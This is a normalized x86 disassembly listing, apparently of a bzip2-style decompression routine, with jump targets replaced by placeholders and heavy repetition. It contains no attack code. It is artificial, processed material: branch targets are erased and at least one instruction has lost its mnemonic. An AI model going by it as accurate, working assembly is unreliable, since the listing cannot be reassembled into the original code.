mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x90
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov [ ebx + 0x4 ] 0x1
push 0x4
jmp r-xdata
xor eax eax
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffb
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x39
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp al 0x31
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffc
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x2c ]
cmp [ ebx + 0x30 ] 0x2
mov eax [ ebx + 0x2c ]
jl r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
add ecx 0xa
cmp eax ecx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0x100
lea eax [ ebx + 0xc6c ]
push 0x0
push eax
call sub_100209e0
add esp 0xc
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
shl eax 0x4
add eax ebx
mov [ eax + ecx + 0xc6c ] 0x1
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x6
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x44 ]
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov al [ ebp - 0x1c ]
inc [ ebp - 0x10 ]
mov [ ebx + ecx + 0x650e ] al
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec [ ebp - 0x34 ]
inc [ ebp - 0x34 ]
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
imul eax eax 0x102
mov cl [ ebp - 0x34 ]
add eax ebx
inc [ ebp - 0x10 ]
mov [ eax + edx + 0xab60 ] cl
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x60 ]
jl r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x2c ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x48 ]
shl ecx 0x2
cmp eax [ ecx + edx ]
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebx + 0xc5c ] 0x0
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10020040
leave
retn
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
add eax 0xffffffd0
cmp [ ebx + 0x28 ] 0x0
mov [ ebx + 0x24 ] eax
push 0x1
je r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
and [ ebx + 0xc58 ] 0x0
push eax
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0xc
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
and [ ebp - 0x10 ] 0x0
jmp r-xdata
inc [ eax + 0xc ]
mov eax [ ebp - 0x10 ]
cmp eax 0x10
jge r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x10 ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov edx [ ebp - 0x50 ]
cmp [ ebp - 0x10 ] edx
jge r-xdata
inc [ eax + 0xc ]
jmp r-xdata
xor edi edi
xor cl cl
cmp [ ebp - 0x44 ] edi
jle r-xdata
and [ ebp - 0x1c ] 0x0
inc [ eax + 0xc ]
cmp [ ebp - 0x34 ] 0x14
jg r-xdata
cmp [ ebp - 0x34 ] 0x1
jl r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x3c ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov ecx [ ebp - 0x40 ]
sub eax [ ecx + esi * 4 ]
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
mov ecx [ ebp - 0x40 ]
sub eax [ ecx + esi * 4 ]
js r-xdata
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ ebp - 0x14 ]
mov edx [ ebp - 0x40 ]
sub eax [ ecx + edx ]
jmp r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ ebx + 0xfa14 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ ebx + 0xfa18 ] ecx
mov ecx [ ebp - 0x3c ]
mov [ ebx + 0xfa1c ] ecx
mov ecx [ ebp - 0x60 ]
mov [ ebx + 0xfa20 ] ecx
mov ecx [ ebp - 0x44 ]
mov [ ebx + 0xfa24 ] ecx
mov ecx [ ebp - 0x50 ]
mov [ ebx + 0xfa28 ] ecx
mov ecx [ ebp - 0x64 ]
mov [ ebx + 0xfa2c ] ecx
mov ecx [ ebp - 0x24 ]
mov [ ebx + 0xfa30 ] ecx
mov ecx [ ebp - 0x28 ]
mov [ ebx + 0xfa34 ] ecx
mov ecx [ ebp - 0x54 ]
mov [ ebx + 0xfa38 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ ebx + 0xfa3c ] ecx
mov ecx [ ebp - 0x18 ]
mov [ ebx + 0xfa40 ] ecx
mov ecx [ ebp - 0x20 ]
mov [ ebx + 0xfa44 ] ecx
mov ecx [ ebp - 0x74 ]
mov [ ebx + 0xfa48 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ ebx + 0xfa4c ] ecx
mov ecx [ ebp - 0x80 ]
mov [ ebx + 0xfa50 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0xfa54 ] ecx
mov ecx [ ebp - 0x2c ]
mov [ ebx + 0xfa58 ] ecx
mov ecx [ ebp - 0x6c ]
mov [ ebx + 0xfa5c ] ecx
mov ecx [ ebp - 0x70 ]
mov [ ebx + 0xfa60 ] ecx
mov ecx [ ebp - 0x5c ]
mov [ ebx + 0xfa64 ] ecx
mov ecx [ ebp - 0x48 ]
mov [ ebx + 0xfa68 ] ecx
mov ecx [ ebp - 0x40 ]
mov [ ebx + 0xfa6c ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xfa70 ] ecx
jmp r-xdata
imul eax eax 0x61a80
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
mov [ ebx + 0xc4c ] eax
jmp r-xdata
imul eax eax 0x30d40
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
mov [ ebx + 0xc50 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
inc eax
push 0x1
sar eax 0x1
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0x18
cmp [ ebx + 0xc50 ] 0x0
mov [ ebx + 0xc54 ] eax
je r-xdata
cmp [ ebp - 0x10 ] 0x10
jl r-xdata
and [ ebx + 0xc68 ] 0x0
xor eax eax
cmp [ ebx + eax + 0xd6c ] 0x0
je r-xdata
cmp edx edi
mov [ ebp - 0x10 ] edi
jle r-xdata
xor eax eax
mov eax [ ebp - 0x44 ]
and [ ebp - 0x3c ] 0x0
test eax eax
jle r-xdata
cmp eax 0x102
jge r-xdata
cmp eax 0x102
jge r-xdata
js r-xdata
test eax eax
jne r-xdata
push 0xfffffffd
inc eax
cmp eax 0x100
jl r-xdata
mov ecx [ ebx + 0xc68 ]
mov [ ebx + ecx + 0xd7c ] al
inc [ ebx + 0xc68 ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
and [ ebp - 0x3c ] 0x0
jmp r-xdata
mov dl [ ebx + edi + 0x650e ]
movzx eax dl
lea eax [ ebp + eax - 0xc ]
mov cl [ eax ]
test dl dl
jbe r-xdata
mov [ ebp + eax - 0xc ] cl
inc cl
movzx eax cl
cmp eax [ ebp - 0x44 ]
jl r-xdata
mov eax [ ebx + 0xc68 ]
and [ ebp - 0x28 ] 0x0
inc eax
mov [ ebp - 0x64 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
mov edx 0x100
mov [ ebp - 0x30 ] eax
xor eax eax
lea edi [ ebx + 0x40 ]
mov ecx edx
[ edi ]
push 0xf
mov [ ebp - 0x10 ] edx
mov esi 0xfff
pop eax
lea edi [ ebx + 0x1eb8 ]
lea ecx [ ebx + 0xab60 ]
lea edi [ ebx + 0xf9fc ]
lea edx [ ebx + 0xc99c ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x4c ]
mov eax [ ecx + eax * 4 ]
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x4c ]
mov eax [ ecx + eax * 4 ]
xor edx edx
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
cmp [ eax + ebx + 0xc6c ] 0x0
je r-xdata
mov eax [ ebx + 0xc68 ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x10
jl r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
mov [ ebx + edi + 0x1ebc ] cl
inc edi
cmp edi [ ebp - 0x50 ]
mov [ ebp - 0xc ] cl
jl r-xdata
mov esi eax
mov dl [ ebp - 0x24 ]
add dl cl
mov [ ebx + esi + 0xe7c ] dl
dec esi
dec [ ebp - 0x24 ]
jns r-xdata
lea ecx [ esi + 0x1 ]
mov [ edi ] ecx
dec eax
sub edi 0x4
test eax eax
jge r-xdata
push [ ebp - 0x60 ]
lea eax [ edx + 0x1830 ]
push [ ebp - 0x24 ]
push esi
push eax
lea eax [ edx - 0x1830 ]
push eax
mov eax [ ebp - 0x30 ]
call sub_1001ac90
add [ ebp - 0x30 ] 0x102
mov [ edi ] esi
add esp 0x14
add edi 0x4
add edx 0x408
dec [ ebp - 0x64 ]
jne r-xdata
mov ecx [ ebp - 0x30 ]
movzx eax [ ecx + eax ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
jl r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x74 ]
cmp eax 0x200000
jge r-xdata
cmp eax 0x1
je r-xdata
add eax 0x2
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x10 ] edi
mov al [ esi - 0x1 ]
dec dl
mov [ esi ] al
dec esi
test dl dl
ja r-xdata
mov cl al
mov [ ebp - 0x24 ] 0xf
shl cl 0x4
xor eax eax
cmp [ ebp - 0x50 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x24 ] eax
jle r-xdata
xor eax eax
cmp [ ebp - 0x60 ] eax
push 0x20
pop esi
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] eax
jle r-xdata
cmp eax esi
jge r-xdata
mov [ ebp - 0x24 ] eax
cmp eax [ ebp - 0x18 ]
jge r-xdata
or [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x74 ] 0x1
cmp edi 0x1
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1e7c ]
movzx eax [ eax + ebx + 0xe7c ]
mov cl [ eax + ebx + 0xd7c ]
inc [ ebp - 0x20 ]
mov esi [ ebp - 0x20 ]
movzx eax cl
